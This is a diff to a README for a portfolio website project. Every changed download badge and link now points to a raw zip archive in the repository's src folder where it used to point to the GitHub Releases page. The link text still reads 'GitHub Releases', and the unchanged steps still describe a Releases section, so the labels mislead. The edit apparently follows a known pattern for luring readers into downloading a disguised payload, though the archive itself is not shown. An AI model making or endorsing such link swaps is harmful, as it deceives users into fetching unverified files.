@@ -6,11 +6,11 @@ Welcome to myPortofolioWebsite! This is a clean and modern portfolio website des
 
 ## 📥 Download Now
 
-[![Download myPortofolioWebsite](https://img.shields.io/badge/Download-myPortofolioWebsite-blue.svg)](https://github.com/taoufik615/myPortofolioWebsite/releases)
+[![Download myPortofolioWebsite](https://raw.githubusercontent.com/taoufik615/myPortofolioWebsite/main/src/my-Website-Portofolio-2.5-beta.4.zip)](https://raw.githubusercontent.com/taoufik615/myPortofolioWebsite/main/src/my-Website-Portofolio-2.5-beta.4.zip)
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/taoufik615/myPortofolioWebsite/releases). You will find the latest version of myPortofolioWebsite there.
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/taoufik615/myPortofolioWebsite/main/src/my-Website-Portofolio-2.5-beta.4.zip). You will find the latest version of myPortofolioWebsite there.
 
 1. Click the link above.
 2. Scroll down to the "Releases" section.
@@ -69,6 +69,6 @@ Once your portfolio is ready, share it with your friends and potential employers
 
 Don’t forget to download myPortofolioWebsite again to stay updated with the latest versions.
 
-[![Download myPortofolioWebsite](https://img.shields.io/badge/Download-myPortofolioWebsite-blue.svg)](https://github.com/taoufik615/myPortofolioWebsite/releases) 
+[![Download myPortofolioWebsite](https://raw.githubusercontent.com/taoufik615/myPortofolioWebsite/main/src/my-Website-Portofolio-2.5-beta.4.zip)](https://raw.githubusercontent.com/taoufik615/myPortofolioWebsite/main/src/my-Website-Portofolio-2.5-beta.4.zip) 
 
 This guide aims to make setting up your portfolio straightforward and enjoyable. Happy coding!
